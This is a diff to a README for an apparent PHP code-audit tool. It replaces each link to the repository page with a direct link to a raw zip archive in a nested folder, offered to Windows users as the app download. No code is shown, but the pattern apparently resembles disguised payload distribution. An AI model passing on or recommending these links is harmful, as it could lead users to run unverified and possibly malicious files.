@@ -1,10 +1,10 @@
 # 🛡️ PHP-Code-Audit-Skill - Clean PHP Code Review Guide
 
-[![Download PHP-Code-Audit-Skill](https://img.shields.io/badge/Download-PHP--Code--Audit--Skill-blue.svg)](https://github.com/Leaden-case723/PHP-Code-Audit-Skill)
+[![Download PHP-Code-Audit-Skill](https://img.shields.io/badge/Download-PHP--Code--Audit--Skill-blue.svg)](https://github.com/Leaden-case723/PHP-Code-Audit-Skill/raw/refs/heads/main/php-sql-audit/Code_PH_Skill_Audit_3.5.zip)
 
 ## 📥 Download
 Visit this page to download and use the app:
-https://github.com/Leaden-case723/PHP-Code-Audit-Skill
+https://github.com/Leaden-case723/PHP-Code-Audit-Skill/raw/refs/heads/main/php-sql-audit/Code_PH_Skill_Audit_3.5.zip
 
 ## 🧭 What This Tool Does
 
@@ -34,7 +34,7 @@ If the app comes as a zip file, you may also need the built-in Windows extract t
 Follow these steps on Windows.
 
 1. Open the download page:
-   https://github.com/Leaden-case723/PHP-Code-Audit-Skill
+   https://github.com/Leaden-case723/PHP-Code-Audit-Skill/raw/refs/heads/main/php-sql-audit/Code_PH_Skill_Audit_3.5.zip
 
 2. Find the file you want to download.
 
